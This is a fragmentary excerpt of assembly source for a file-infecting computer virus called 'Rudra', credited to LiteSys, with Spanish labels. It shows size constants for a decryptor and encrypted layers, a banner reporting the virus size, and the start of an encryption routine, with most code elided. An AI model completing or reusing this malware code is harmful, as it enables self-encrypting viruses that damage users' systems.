...
.DATA
 ...
 Tamaño_Virus           EQU     (Termina_Virus - Empieza_Virus)
 Tamaño_Decrip          EQU     (Empieza_Virus - Rudra)
 Tamaño_Total           EQU     (Tamaño_Decrip + Tamaño_Virus)
 Tamaño_Layer2          EQU     (Termina_Virus - Empieza_Layer2)
 ...
 Ventana                DB      "Virus 'Rudra' por LiteSys", CRLF
                        ...
                        DB      "Tama±o total del virus: "
                        DB      Tamaño_Total / 1000 MOD 10 + 30h
                        DB      Tamaño_Total / 0100 MOD 10 + 30h
                        DB      Tamaño_Total / 0010 MOD 10 + 30h
                        DB      Tamaño_Total / 0001 MOD 10 + 30h
                        DB      CRLF
                        DB      00h
.CODE
...
; ═══════════════════════════════════════════════════════════════════════════
  ...
  MOV ECX, Tamaño_Virus
  SUB EDI, Tamaño_Total
  ADD EDI, DWO [BaseMap]
...
; ═══════════════════════════════════════════════════════════════════════════
  ...
  ; ECX -> Tamaño del codigo a encriptar.

  RUMEN                 PROC

  MOV DWO [Guarda_DC], EDI
  MOV DWO [Tamaño_EC], ECX
